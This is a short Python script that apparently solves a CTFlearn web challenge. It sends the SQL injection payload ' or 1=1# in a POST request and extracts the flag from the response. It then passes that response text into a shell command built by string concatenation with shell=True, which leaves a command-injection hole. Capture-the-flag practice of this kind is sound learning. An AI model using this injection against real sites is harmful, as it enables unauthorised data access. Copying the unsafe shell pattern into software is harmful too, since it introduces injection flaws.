#!/usr/bin/env python3

import requests
import subprocess

resp = requests.post("https://web.ctflearn.com/web4/", data={"submit":"Submit", "input":"' or 1=1#"})

flag=resp.text.split("fl4g__giv3r")[1]
flag=flag.split("<br>")[1]

editFlag = subprocess.call("echo " + flag + ''' | tr -d " " | cut -d ":" -f2''', shell=True)

